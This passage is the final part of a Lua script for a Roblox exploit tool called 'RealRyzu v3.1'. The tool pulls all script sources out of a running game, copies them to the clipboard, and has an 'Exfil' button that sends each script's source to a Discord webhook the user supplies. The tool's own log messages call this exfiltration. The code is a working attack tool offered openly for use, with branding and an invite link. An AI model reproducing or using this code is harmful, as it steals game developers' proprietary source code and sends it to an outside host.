            Log("⚠ Save failed — no save method available", Color3.fromRGB(255, 150, 100))
            Log("   Methods tried: " .. table.concat(methods, ", "), Color3.fromRGB(255, 180, 150))
            Log("   Scripts still rebuilt in services", Color3.fromRGB(255, 220, 100))
            StatusLabel.Text = "STATUS: Save unavailable (scripts rebuilt)"
            StatusLabel.TextColor3 = Color3.fromRGB(255, 200, 55)
        end
    else
        Log("✓ Scripts rebuilt in services", Color3.fromRGB(150, 255, 150))
        StatusLabel.Text = "STATUS: Script dump complete"
        StatusLabel.TextColor3 = Color3.fromRGB(0, 255, 150)
    end
    
    -- Step 6: Backup scripts to clipboard
    if CONFIG.ScriptBackup then
        StatusLabel.Text = "STATUS: Backing up scripts..."
        local allSource = RYZU_WATERMARK_DEEP .. "\n\n-- RealRyzu Script Backup\n-- Game: " .. (game.PlaceId or "N/A") .. "\n-- Date: " .. os.date() .. "\n\n"
        local count = 0
        for _, t in ipairs(EXPORT_TARGETS) do
            for _, obj in ipairs(t.Dest:GetDescendants()) do
                if obj:IsA("Script") or obj:IsA("LocalScript") or obj:IsA("ModuleScript") then
                    local src = ""
                    pcall(function() src = obj.Source end)
                    if src ~= "" then
                        allSource = allSource .. "-- " .. obj:GetFullName() .. "\n" .. src .. "\n\n"
                        count = count + 1
                    end
                end
            end
        end
        pcall(function() setclipboard(allSource) end)
        Log("✓ " .. count .. " scripts backed up to clipboard", Color3.fromRGB(150, 255, 150))
    end
    
    -- Step 7: Restore original
    if CONFIG.RestoreAfterExport then
        StatusLabel.Text = "STATUS: Restoring original game..."
        Backup:Restore()
        Log("✓ Original game restored", Color3.fromRGB(150, 255, 150))
    end
    
    local elapsed = tick() - exportStartTime
    Log(string.rep("═", 45), Color3.fromRGB(0, 200, 255))
    Log("  EXPORT COMPLETE — " .. string.format("%.1fs", elapsed), Color3.fromRGB(0, 240, 255))
    Log("  Objects: " .. clonedObj, Color3.fromRGB(150, 255, 150))
    Log("  Scripts: " .. taggedScripts, Color3.fromRGB(150, 255, 150))
    Log("  Corrupted fixed: " .. fixed, Color3.fromRGB(255, 220, 100))
    Log(string.rep("═", 45), Color3.fromRGB(0, 200, 255))
    
    isExporting = false
    ExportBtn.Text = "🔴 EXPORT CLEAN RBXL"
    ExportBtn.BackgroundColor3 = Color3.fromRGB(0, 155, 245)
    RuntimeLabel.Text = string.format("Runtime: %.1fs | Done", elapsed)
end

-- ============================================================
-- BUTTON HANDLERS
-- ============================================================
ExportBtn.MouseButton1Click:Connect(function()
    task.spawn(function() RunExport(false) end)
end)

DumpBtn.MouseButton1Click:Connect(function()
    task.spawn(function() RunExport(true) end)
end)

ExfilBtn.MouseButton1Click:Connect(function()
    WebhookBox.Visible = not WebhookBox.Visible
    if WebhookBox.Visible then WebhookBox:CaptureFocus() end
end)

WebhookBox.FocusLost:Connect(function(enter)
    if enter and WebhookBox.Text ~= "" then
        if Discord:Set(WebhookBox.Text) then
            Log("✓ Webhook set — scripts will exfiltrate", Color3.fromRGB(150, 255, 150))
            WebhookBox.Visible = false
            
            -- Start exfil
            if Discord.URL ~= "" then
                task.spawn(function()
                    Log("Starting exfiltration...", Color3.fromRGB(255, 200, 55))
                    for _, t in ipairs(EXPORT_TARGETS) do
                        for _, obj in ipairs(t.Dest:GetDescendants()) do
                            if obj:IsA("Script") or obj:IsA("LocalScript") or obj:IsA("ModuleScript") then
                                local src = ""
                                pcall(function() src = obj.Source end)
                                if src ~= "" then
                                    Discord:SendLarge(src, obj.Name .. ".lua")
                                    task.wait(0.4)
                                end
                            end
                        end
                    end
                    Log("✓ Exfiltration complete — " .. Discord.Sent .. " chunks", Color3.fromRGB(150, 255, 150))
                end)
            end
        else
            Log("Invalid webhook URL", Color3.fromRGB(255, 120, 120))
        end
    end
end)

-- Delete key closes
UserInputService.InputBegan:Connect(function(input, gpe)
    if gpe then return end
    if input.KeyCode == Enum.KeyCode.Delete and not isExporting then
        ScreenGui:Destroy()
    end
end)

-- ============================================================
-- INIT
-- ============================================================
pcall(function()
    local info = MarketplaceService:GetProductInfo(game.PlaceId)
    if info and info.Name then GameLabel.Text = "Game: " .. info.Name end
end)

Log("RealRyzu v3.1 loaded — FIXED RBXL EXPORTER", Color3.fromRGB(0, 245, 255))
Log("Safe mode ON — no nil calls, no corruption", Color3.fromRGB(110, 230, 110))
Log("Clone → Inject → Validate → Save → Restore", Color3.fromRGB(110, 230, 110))
Log("discord.gg/realryzu", Color3.fromRGB(0, 205, 250))
Log("Ready — press EXPORT CLEAN RBXL", Color3.fromRGB(150, 255, 150))
